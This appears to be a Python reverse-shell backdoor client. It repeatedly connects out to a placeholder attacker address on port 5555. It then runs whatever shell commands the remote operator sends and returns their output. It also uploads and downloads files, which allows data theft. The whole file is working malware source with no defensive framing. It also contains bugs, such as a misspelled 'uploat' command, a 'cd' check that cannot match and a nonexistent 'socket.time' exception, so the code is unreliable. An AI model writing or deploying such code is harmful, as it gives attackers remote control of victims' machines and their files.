import socket
import time
import json
import subprocess
import os

def reliable_send(data):
    jsondata=json.dumps(data)
    s.send(jsondata.encode())


def realiable_recv():
    data=""
    while True:
        try:
            data =data+s.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue

def connection():
    while True:
        time.sleep(20)
        try:
            s.connect(('Enter ip address',5555))
            shell()
            s.close()
            break
        except:
            connection()
def download_file(file_name):
    f=open(file_name,"wb")
    s.settimeout(1)
    chunk=s.recv(1024)
    while chunk:
        f.write(chunk)
        try:
            chunk=s.recv(1024)
        except socket.time as e:
            break
        s.settimeout(None)
        f.close()

def upload_file(file_name):
    f=open(file_name,'rb')
    s.send(f.read())

def shell():
    while True:
        command= realiable_recv()
        if command=="quit":
                break
        elif command[:3]=="cd":
            os.chdir(command[3:])
        elif command[:8]=='download':
            upload_file(command[9:])
        elif command[:6]=='uploat':
            download_file(command[7:])    

        else:
             execute= subprocess.Popen(command,shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)
             result=execute.stdout.read()+execute.stderr.read()
             result=result.decode()
             reliable_send(result)

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
connection()